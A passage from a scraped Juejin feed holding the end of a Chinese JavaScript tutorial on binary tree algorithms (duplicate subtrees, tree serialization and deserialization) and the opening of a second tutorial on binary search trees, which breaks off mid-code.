<p><strong>索引分治是最优解</strong>：全程操作原数组，无数组拷贝，空间复杂度O(n)（递归栈）；</p>
</li>
<li>
<p><strong>Map是性能刚需</strong>：将根节点查询时间从O(n)降至O(1)，避免时间复杂度升至O(n²)；</p>
</li>
<li>
<p><strong>节点数是核心桥梁</strong>：中序/后序中计算的左子树节点数，是分割前序/后序序列的唯一依据；</p>
</li>
<li>
<p><strong>边界处理要严谨</strong>：区间为<strong>闭区间</strong>，不可随意增减索引，避免节点缺失/重复。</p>
</li>
</ol>
<h3 data-id="heading-17">四、二叉树后序篇：子树相关问题的核心解法（后序篇）</h3>
<p>通过前面的题目我们发现：<strong>后序位置是处理子树相关问题的黄金位置</strong>——因为后序能获取左右子树的返回值，而子树问题的本质，正是基于子树的结果推导当前节点的答案。</p>
<p>LeetCode 652「寻找重复的子树」是后序思维的经典应用，结合<strong>子树序列化</strong>和<strong>哈希表统计</strong>，完美体现「后序+分解问题」的解题思路。</p>
<h4 data-id="heading-18">题：寻找重复的子树（LeetCode 652）</h4>
<p><strong>题目要求</strong>：找出二叉树中所有重复的子树，返回重复子树的根节点数组（每个重复子树仅返回一次）。</p>
<p><strong>核心思路</strong>：</p>
<ol>
<li>
<p><strong>后序序列化子树</strong>：按「左→右→根」拼接子树标识（唯一标识子树结构，避免歧义）；</p>
</li>
<li>
<p><strong>哈希表统计次数</strong>：用Map记录每个子树标识的出现次数；</p>
</li>
<li>
<p><strong>首次重复时收集</strong>：仅当子树出现次数从1→2时收集根节点（避免重复添加）。</p>
</li>
</ol>
<p><strong>关键细节</strong>：</p>
<ul>
<li>
<p>空节点必须用<strong>统一标记（#）</strong> 表示，不可省略（缺失会导致结构歧义）；</p>
</li>
<li>
<p>节点值/空标记必须用<strong>分隔符（,）</strong> 分隔，避免多位数拼接冲突（如12和1,2）；</p>
</li>
<li>
<p>序列化顺序必须为<strong>左→右→根</strong>（标准后序），能最大程度保留子树结构信息，避免标识重复。</p>
</li>
</ul>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 寻找重复子树：后序序列化+哈希统计+分解问题思维
 * 核心：后序位置返回子树标识，利用子树结果统计重复
 */</span>
<span class="hljs-keyword">var</span> findDuplicateSubtrees = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-keyword">const</span> countMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(); <span class="hljs-comment">// 子树标识→出现次数</span>
    <span class="hljs-keyword">const</span> result = []; <span class="hljs-comment">// 存储重复子树根节点</span>

    <span class="hljs-comment">// 函数定义：序列化当前节点为根的子树，返回唯一标识</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">serialize</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'#'</span>; <span class="hljs-comment">// 空节点标记，不可省略</span>
        <span class="hljs-comment">// 后序遍历：先序列化左右子树（子问题）</span>
        <span class="hljs-keyword">const</span> left = <span class="hljs-title function_">serialize</span>(node.<span class="hljs-property">left</span>);
        <span class="hljs-keyword">const</span> right = <span class="hljs-title function_">serialize</span>(node.<span class="hljs-property">right</span>);
        <span class="hljs-comment">// 后序位置：拼接当前子树标识（左→右→根，标准后序）</span>
        <span class="hljs-keyword">const</span> curStr = <span class="hljs-string">`<span class="hljs-subst">${left}</span>,<span class="hljs-subst">${right}</span>,<span class="hljs-subst">${node.val}</span>`</span>;
        <span class="hljs-comment">// 统计次数，首次重复时收集（count===2）</span>
        <span class="hljs-keyword">const</span> count = (countMap.<span class="hljs-title function_">get</span>(curStr) || <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;
        countMap.<span class="hljs-title function_">set</span>(curStr, count);
        <span class="hljs-keyword">if</span> (count === <span class="hljs-number">2</span>) result.<span class="hljs-title function_">push</span>(node);
        <span class="hljs-comment">// 返回子树标识，供父节点拼接（分解问题的核心）</span>
        <span class="hljs-keyword">return</span> curStr;
    }

    <span class="hljs-title function_">serialize</span>(root);
    <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h4 data-id="heading-19">后序思维核心总结</h4>
<ol>
<li>
<p><strong>子树问题必用后序</strong>：只要题目与子树相关，大概率需要在后序位置写代码，利用子树的返回值；</p>
</li>
<li>
<p><strong>后序是分解问题的核心</strong>：后序位置能获取左右子树的处理结果，是「子问题推导原问题」的最佳时机；</p>
</li>
<li>
<p><strong>序列化标识要唯一</strong>：子树序列化需满足「空节点标记+分隔符+标准遍历顺序」，避免结构歧义。</p>
</li>
</ol>
<h3 data-id="heading-20">五、二叉树序列化与反序列化：遍历的极致应用（序列化篇）</h3>
<p>序列化的目的是<strong>将二叉树转换为独立于编程语言的格式</strong>（如字符串），方便存储/传输；反序列化则是将序列化格式还原为二叉树，核心要求是<strong>能还原出唯一的二叉树</strong>。</p>
<h4 data-id="heading-21">序列化与反序列化的核心结论</h4>
<p>当二叉树节点值无重复时，序列化结果的<strong>唯一性</strong>取决于「是否包含空节点信息」和「遍历顺序」，总结为3条核心规则：</p>
<ol>
<li>
<p><strong>无空节点信息</strong>：仅一种遍历顺序无法唯一还原，前序+中序/后序+中序可还原，前序+后序不可还原；</p>
</li>
<li>
<p><strong>有空节点信息</strong>：前序/后序可唯一还原（根节点位置固定），中序<strong>无法还原</strong>（根节点位置不固定）；</p>
</li>
<li>
<p><strong>层序遍历</strong>：包含空节点信息时可唯一还原，是工程中最常用的序列化方式（按层存储，结构直观）。</p>
</li>
</ol>
<h4 data-id="heading-22">核心通用规则</h4>
<p>无论哪种遍历方式的序列化/反序列化，都需遵守3条通用规则：</p>
<ol>
<li>
<p><strong>空节点显式标记</strong>：用统一符号（如#）标记空节点，不可省略；</p>
</li>
<li>
<p><strong>分隔符分隔</strong>：用逗号（,）分隔节点值/空标记，避免拼接冲突；</p>
</li>
<li>
<p><strong>遍历顺序一致</strong>：反序列化的遍历顺序必须与序列化完全一致（如前序序列化→前序反序列化）。</p>
</li>
</ol>
<p>下面依次讲解<strong>前序、后序、层序</strong>的序列化与反序列化实现（中序无法唯一反序列化，无需实现），均为<strong>工程优化版</strong>，兼顾效率与鲁棒性。</p>
<h4 data-id="heading-23">1. 前序序列化与反序列化</h4>
<p><strong>核心规则</strong>：序列化按「根→左→右」，反序列化也按「根→左→右」，用<strong>索引指针</strong>替代数组shift（O(1)效率）。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">NULL_NODE_MARK</span> = <span class="hljs-string">'#'</span>; <span class="hljs-comment">// 空节点标记，单一数据源</span>

<span class="hljs-comment">/**
 * 前序序列化：根→左→右，包含空节点标记
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serializePreorder</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-keyword">const</span> res = [];
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">traverse</span>(<span class="hljs-params">node</span>) {
    <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) {
      res.<span class="hljs-title function_">push</span>(<span class="hljs-variable constant_">NULL_NODE_MARK</span>);
      <span class="hljs-keyword">return</span>;
    }
    res.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">val</span>); <span class="hljs-comment">// 前序：先根</span>
    <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">left</span>); <span class="hljs-comment">// 再左</span>
    <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">right</span>); <span class="hljs-comment">// 最后右</span>
  }
  <span class="hljs-title function_">traverse</span>(root);
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>);
}

<span class="hljs-comment">/**
 * 前序反序列化：根→左→右，索引指针优化
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deserializePreorder</span>(<span class="hljs-params">serializeStr</span>) {
  <span class="hljs-keyword">if</span> (!serializeStr || serializeStr.<span class="hljs-title function_">trim</span>() === <span class="hljs-string">''</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">const</span> arr = serializeStr.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>);
  <span class="hljs-keyword">let</span> idx = <span class="hljs-number">0</span>; <span class="hljs-comment">// 索引指针，O(1)取数</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> val = arr[idx++];
    <span class="hljs-keyword">if</span> (val === <span class="hljs-variable constant_">NULL_NODE_MARK</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">const</span> node = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(<span class="hljs-title class_">Number</span>(val));
    node.<span class="hljs-property">left</span> = <span class="hljs-title function_">build</span>(); <span class="hljs-comment">// 先构建左子树</span>
    node.<span class="hljs-property">right</span> = <span class="hljs-title function_">build</span>(); <span class="hljs-comment">// 再构建右子树</span>
    <span class="hljs-keyword">return</span> node;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">build</span>();
}
</code></pre>
<h4 data-id="heading-24">2. 后序序列化与反序列化</h4>
<p><strong>核心规则</strong>：序列化按「左→右→根」，反序列化从<strong>数组尾部取元素</strong>（根在尾部），且<strong>先构建右子树，再构建左子树</strong>（与序列化顺序镜像）。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">NULL_NODE_MARK</span> = <span class="hljs-string">'#'</span>;

<span class="hljs-comment">/**
 * 后序序列化：左→右→根，包含空节点标记
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serializePostorder</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-keyword">const</span> res = [];
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">traverse</span>(<span class="hljs-params">node</span>) {
    <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) {
      res.<span class="hljs-title function_">push</span>(<span class="hljs-variable constant_">NULL_NODE_MARK</span>);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">left</span>); <span class="hljs-comment">// 先左</span>
    <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">right</span>); <span class="hljs-comment">// 再右</span>
    res.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">val</span>); <span class="hljs-comment">// 最后根</span>
  }
  <span class="hljs-title function_">traverse</span>(root);
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>);
}

<span class="hljs-comment">/**
 * 后序反序列化：从尾部取元素，先右后左构建
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deserializePostorder</span>(<span class="hljs-params">serializeStr</span>) {
  <span class="hljs-keyword">if</span> (!serializeStr || serializeStr.<span class="hljs-title function_">trim</span>() === <span class="hljs-string">''</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">const</span> arr = serializeStr.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>);
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> val = arr.<span class="hljs-title function_">pop</span>(); <span class="hljs-comment">// 尾部取元素，根在最后</span>
    <span class="hljs-keyword">if</span> (val === <span class="hljs-variable constant_">NULL_NODE_MARK</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">const</span> node = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(<span class="hljs-title class_">Number</span>(val));
    node.<span class="hljs-property">right</span> = <span class="hljs-title function_">build</span>(); <span class="hljs-comment">// 先构建右子树（镜像顺序）</span>
    node.<span class="hljs-property">left</span> = <span class="hljs-title function_">build</span>(); <span class="hljs-comment">// 再构建左子树</span>
    <span class="hljs-keyword">return</span> node;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">build</span>();
}
</code></pre>
<h4 data-id="heading-25">3. 层序序列化与反序列化（工程推荐）</h4>
<p><strong>核心规则</strong>：按「从上到下、从左到右」遍历，用<strong>队列</strong>实现按层访问，反序列化时用队列维护<strong>待构建子树的父节点</strong>，按顺序分配左右子节点。</p>
<p><strong>工程优化</strong>：序列化时去除末尾冗余空标记，让结果更紧凑；反序列化时增加边界校验，增强鲁棒性。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">NULL_NODE_MARK</span> = <span class="hljs-string">'#'</span>;

<span class="hljs-comment">/**
 * 层序序列化：队列实现，去除末尾冗余空标记（工程优化）
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">serializeLevelorder</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-keyword">if</span> (root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">NULL_NODE_MARK</span>;
  <span class="hljs-keyword">const</span> res = [];
  <span class="hljs-keyword">const</span> queue = [root];
  <span class="hljs-keyword">while</span> (queue.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">const</span> node = queue.<span class="hljs-title function_">shift</span>();
    <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) {
      res.<span class="hljs-title function_">push</span>(<span class="hljs-variable constant_">NULL_NODE_MARK</span>);
      <span class="hljs-keyword">continue</span>;
    }
    res.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">val</span>);
    queue.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">left</span>); <span class="hljs-comment">// 左右子节点均入队，无论是否为空</span>
    queue.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">right</span>);
  }
  <span class="hljs-comment">// 去除末尾冗余空标记，优化存储</span>
  <span class="hljs-keyword">while</span> (res[res.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>] === <span class="hljs-variable constant_">NULL_NODE_MARK</span>) res.<span class="hljs-title function_">pop</span>();
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>);
}

<span class="hljs-comment">/**
 * 层序反序列化：队列维护父节点，按顺序分配左右子节点
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deserializeLevelorder</span>(<span class="hljs-params">serializeStr</span>) {
  <span class="hljs-keyword">if</span> (!serializeStr || serializeStr.<span class="hljs-title function_">trim</span>() === <span class="hljs-string">''</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">const</span> arr = serializeStr.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>);
  <span class="hljs-keyword">let</span> idx = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(<span class="hljs-title class_">Number</span>(arr[idx++]));
  <span class="hljs-keyword">const</span> queue = [root]; <span class="hljs-comment">// 队列存储待构建子树的父节点</span>

  <span class="hljs-keyword">while</span> (queue.<span class="hljs-property">length</span> &amp;&amp; idx &lt; arr.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">const</span> parent = queue.<span class="hljs-title function_">shift</span>();
    <span class="hljs-comment">// 构建左子节点</span>
    <span class="hljs-keyword">if</span> (idx &lt; arr.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">const</span> leftVal = arr[idx++];
      parent.<span class="hljs-property">left</span> = leftVal !== <span class="hljs-variable constant_">NULL_NODE_MARK</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(<span class="hljs-title class_">Number</span>(leftVal)) : <span class="hljs-literal">null</span>;
      parent.<span class="hljs-property">left</span> &amp;&amp; queue.<span class="hljs-title function_">push</span>(parent.<span class="hljs-property">left</span>);
    }
    <span class="hljs-comment">// 构建右子节点</span>
    <span class="hljs-keyword">if</span> (idx &lt; arr.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">const</span> rightVal = arr[idx++];
      parent.<span class="hljs-property">right</span> = rightVal !== <span class="hljs-variable constant_">NULL_NODE_MARK</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(<span class="hljs-title class_">Number</span>(rightVal)) : <span class="hljs-literal">null</span>;
      parent.<span class="hljs-property">right</span> &amp;&amp; queue.<span class="hljs-title function_">push</span>(parent.<span class="hljs-property">right</span>);
    }
  }
  <span class="hljs-keyword">return</span> root;
}
</code></pre>
<h4 data-id="heading-26">序列化核心总结</h4>
<ol>
<li>
<p><strong>前/后序</strong>：实现简单，递归即可，适合算法题；</p>
</li>
<li>
<p><strong>层序</strong>：结构直观，工程中常用，队列实现按层访问；</p>
</li>
<li>
<p><strong>反序列化关键</strong>：前序用索引指针，后序从尾部取元素，层序用队列维护父节点；</p>
</li>
<li>
<p><strong>唯一性保障</strong>：包含空节点信息的前/后/层序，均可唯一还原二叉树。</p>
</li>
</ol>
<h3 data-id="heading-27">六、二叉树解题心法终极总结</h3>
<p>本文从<strong>解题总纲</strong>到<strong>思维模式</strong>，再到<strong>构造、后序、序列化</strong>三大核心模块，层层拆解了二叉树的解题规律，最终可总结为<strong>三大核心心法</strong>，记牢这几点，所有二叉树问题均可迎刃而解：</p>
<h4 data-id="heading-28">心法1：思维模式二选一，聚焦节点与时机</h4>
<ol>
<li>
<p>遍历思维：直接操作节点，配合外部变量，前序/层序优先；</p>
</li>
<li>
<p>分解问题思维：定义递归函数返回值，利用子树结果，后序优先；</p>
</li>
<li>
<p>所有问题都要聚焦「单个节点该做什么，在什么时候做」。</p>
</li>
</ol>
<h4 data-id="heading-29">心法2：前中后序有分工，后序是子树核心</h4>
<ol>
<li>
<p>前序：先操作当前节点，再递归子节点，适合遍历、翻转、连接等操作；</p>
</li>
<li>
<p>中序：仅适合二叉搜索树（BST）的有序遍历，普通二叉树应用极少；</p>
</li>
<li>
<p>后序：能获取子树返回值，是分解问题、子树相关问题的黄金位置；</p>
</li>
<li>
<p>层序：按层访问，工程常用，适合层序遍历、层序序列化等问题。</p>
</li>
</ol>
<h4 data-id="heading-30">心法3：构造与序列化，各有通用框架</h4>
<ol>
<li>
<p>构造问题：定根→找边界→算大小→分治构建，索引分治+Map优化是最优解；</p>
</li>
<li>
<p>序列化问题：空节点标记+分隔符+一致遍历顺序，前/后/层序均可实现，层序工程首选；</p>
</li>
<li>
<p>子树序列化：左→右→根标准后序，保证标识唯一，避免结构歧义。</p>
</li>
</ol>
<h3 data-id="heading-31">最后</h3>
<p>二叉树的所有问题，本质都是<strong>递归分治</strong>的应用，而递归的核心是「相信递归函数的定义，聚焦当前节点」。本文的所有解法和框架，都建立在「二叉树解题总纲」之上，只要你能理解并灵活运用「遍历」和「分解问题」两种思维，掌握前/中/后序的核心作用，就能轻松应对各类二叉树问题。</p>
<p>建议大家结合本文的代码，在LeetCode上动手实现一遍，从简单题到复杂题，逐步形成自己的解题体系——二叉树的基础打牢了，后续的二叉搜索树（BST）、平衡二叉树（AVL）、红黑树等高级数据结构，都会迎刃而解。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[二叉搜索树（BST）核心心法：从特性到实战，理解高频考点]]></title>    <link>https://juejin.cn/post/7602420156397158443</link>    <guid>https://juejin.cn/post/7602420156397158443</guid>    <pubDate>2026-02-03T10:21:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602420156397158443" data-draft-id="7602411521072136211" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="二叉搜索树（BST）核心心法：从特性到实战，理解高频考点"/> <meta itemprop="keywords" content="后端,JavaScript,算法"/> <meta itemprop="datePublished" content="2026-02-03T10:21:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="颜酱"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            二叉搜索树（BST）核心心法：从特性到实战，理解高频考点
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    颜酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:21:20.000Z" title="Tue Feb 03 2026 10:21:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读42分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">二叉搜索树（BST）核心心法：从特性到实战，理解高频考点</h2>
<p>二叉搜索树（Binary Search Tree，简称BST）是算法领域最基础、最常用的树形数据结构之一，其「左小右大」的核心特性赋予了它高效的查找、插入、删除能力，时间复杂度均为O(logN)（平衡BST下）。同时，BST的中序遍历天然升序的特性，使其能轻松解决有序性相关问题。本文将从<strong>BST核心特性</strong>出发，循序渐进讲解<strong>基础操作、经典题型、进阶实战</strong>，提炼通用解题心法，帮你彻底吃透BST所有高频考点。</p>
<h3 data-id="heading-1">一、BST核心特性：一切操作的基础</h3>
<p>BST的定义看似简单，却是所有解题思路的源头，必须牢牢掌握<strong>严格定义</strong>和<strong>衍生性质</strong>，避免因理解偏差导致解题错误。</p>
<h4 data-id="heading-2">1.1 严格定义（3条核心规则）</h4>
<p>对于BST的任意一个节点<code>node</code>，必须同时满足：</p>
<ol>
<li>
<p>左子树的<strong>所有节点</strong>值都<strong>严格小于</strong><code>node.val</code>；</p>
</li>
<li>
<p>右子树的<strong>所有节点</strong>值都<strong>严格大于</strong><code>node.val</code>；</p>
</li>
<li>
<p>左子树和右子树自身也必须是合法的BST。</p>
</li>
</ol>
<p><strong>关键误区</strong>：切勿简化为「仅当前节点大于左子节点、小于右子节点」，深层子节点的约束会被忽略，导致BST合法性判断、遍历等操作出错。</p>
<h4 data-id="heading-3">1.2 核心衍生性质（算法解题的关键）</h4>
<p>从严格定义可推导出2个最常用的性质，几乎所有BST题目都围绕这两个性质展开：</p>
<ol>
<li>
<p><strong>高效查找性</strong>：根据「左小右大」，查找目标节点时可一次性排除一半子树，无需遍历所有节点，基础查找/插入/删除的时间复杂度为O(logN)（平衡BST），远优于普通二叉树的O(N)；</p>
</li>
<li>
<p><strong>中序遍历有序性</strong>：BST的中序遍历（左→根→右）结果为<strong>严格升序</strong>，逆序中序遍历（右→根→左）结果为<strong>严格降序</strong>。这一性质是解决「第K小元素」「累加树转换」等有序性问题的核心。</p>
</li>
</ol>
<h4 data-id="heading-4">1.3 BST与普通二叉树的核心区别</h4>
<p>普通二叉树的操作仅能通过<strong>全遍历</strong>（前/中/后序）实现，而BST可通过<strong>特性引导遍历</strong>（根据目标值与当前节点值的大小，决定左/右子树遍历），大幅提升效率；同时，BST的有序性是普通二叉树不具备的，这是解决各类有序问题的天然优势。</p>
<h3 data-id="heading-5">二、BST基础操作：查、增、删、验（高频面试题）</h3>
<p>BST的基础操作是所有进阶题型的铺垫，核心思路是**「特性引导遍历找位置 + 针对性修改」**，其中「删除」和「合法性验证」略复杂，需重点掌握。</p>
<h4 data-id="heading-6">2.1 查找节点（力扣700题）</h4>
<h5 data-id="heading-7">核心思路</h5>
<p>利用「左小右大」特性，递归/迭代引导遍历：目标值大于当前节点值则走右子树，小于则走左子树，等于则找到目标节点，空节点则表示未找到。</p>
<h5 data-id="heading-8">实现代码（递归版，简洁高效）</h5>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 查找BST中值为target的节点，找到返回节点，未找到返回null
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} root BST根节点
